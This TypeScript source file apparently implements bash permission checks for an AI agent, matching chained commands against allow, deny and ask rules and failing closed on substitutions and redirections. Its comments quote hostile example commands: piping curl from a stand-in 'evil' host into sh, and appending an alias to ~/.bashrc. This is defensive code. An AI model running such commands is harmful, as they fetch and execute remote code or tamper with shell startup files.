import { type LexCache, lexCached } from "./lex-cache";
import { compiledRules, matchCompiledRule, requestTarget } from "./rules";
import { FILE_REDIRECT_OPS, renderSegment, splitShellSegments } from "./shell";
import type { PermissionRequest } from "./types";

export type { AllowRule } from "./rules";
export { matchAllowRule, parseAllowRule } from "./rules";

// Splits a bash command into its chained segments ("a && b | c; d" →
// ["a", "b", "c", "d"]) using the shell lexer, so separators inside quotes
// don't split and backgrounded commands ("a & b") split like any other chain.
// Returns null — no segment can be trusted — when the command embeds a
// command substitution ("$(...)" or backticks, which hide an arbitrary
// command in a benign one) or any segment writes/reads a file through an
// unquoted redirection (">", ">>", "<") or process substitution (">(...)",
// "<(...)"): `echo 'alias x=...' >> ~/.bashrc` must not sail through on
// bash(echo *). Fd duplication (2>&1) stays allow-eligible.
function splitCommandChain(command: string, lex?: LexCache): string[] | null {
  const tokens = lexCached(lex, command);
  if (tokens.some((token) => token.kind === "subst")) return null;
  const segments = splitShellSegments(tokens);
  for (const segment of segments) {
    if (segment.some((token) => token.kind === "op" && FILE_REDIRECT_OPS.has(token.op))) {
      return null;
    }
  }
  return segments.map(renderSegment).filter((segment) => segment.length > 0);
}

function withCommand(req: PermissionRequest, command: string): PermissionRequest {
  return {
    ...req,
    args: { ...((req.args ?? {}) as Record<string, unknown>), command },
  };
}

// Allow rules apply per chain segment: "bash(git *)" must not wave through
// "git status && curl evil | sh". Every segment has to match some rule, and a
// command with a substitution or a file redirection is never auto-allowed.
export function isAllowedByRules(
  rules: readonly string[],
  req: PermissionRequest,
  lex?: LexCache,
): boolean {
  if (req.toolName !== "bash") return matchesAnyRule(rules, req);
  const command = requestTarget(req);
  if (command === undefined) return matchesAnyRule(rules, req);
  const segments = splitCommandChain(command, lex);
  if (segments === null) return false;
  if (segments.length === 0) return matchesAnyRule(rules, req);
  return segments.every((segment) => matchesAnyRule(rules, withCommand(req, segment)));
}

const MAX_RULE_ANALYSIS_DEPTH = 8;

function matchesBashRules(
  rules: readonly string[],
  req: PermissionRequest,
  command: string,
  lex: LexCache | undefined,
  depth: number,
): boolean {
  if (depth > MAX_RULE_ANALYSIS_DEPTH) {
    return compiledRules(rules).some((rule) => rule !== null);
  }
  const tokens = lexCached(lex, command);
  const segments = splitShellSegments(tokens);
  if (segments.length === 0) return matchesAnyRule(rules, req);
  if (segments.some((segment) => matchesAnyRule(rules, withCommand(req, renderSegment(segment))))) {
    return true;
  }
  return tokens.some(
    (token) => token.kind === "subst" && matchesBashRules(rules, req, token.inner, lex, depth + 1),
  );
}

// Deny rules match any outer segment or command-substitution body. Excessive
// nesting fails closed whenever at least one valid rule exists.
export function isDeniedByRules(
  rules: readonly string[],
  req: PermissionRequest,
  lex?: LexCache,
): boolean {
  if (req.toolName !== "bash") return matchesAnyRule(rules, req);
  const command = requestTarget(req);
  if (command === undefined) return matchesAnyRule(rules, req);
  return matchesBashRules(rules, req, command, lex, 0);
}

// Ask rules use the same outer-and-inner matching as deny rules, so a
// substitution cannot hide a command that requires confirmation.
export function isAskedByRules(
  rules: readonly string[],
  req: PermissionRequest,
  lex?: LexCache,
): boolean {
  if (req.toolName !== "bash") return matchesAnyRule(rules, req);
  const command = requestTarget(req);
  if (command === undefined) return matchesAnyRule(rules, req);
  return matchesBashRules(rules, req, command, lex, 0);
}

function matchesAnyRule(rules: readonly string[], req: PermissionRequest): boolean {
  return compiledRules(rules).some((rule) => rule !== null && matchCompiledRule(rule, req));
}

export function buildAllowRule(req: PermissionRequest): string {
  const target = requestTarget(req);
  return target !== undefined ? `${req.toolName}(${target})` : req.toolName;
}
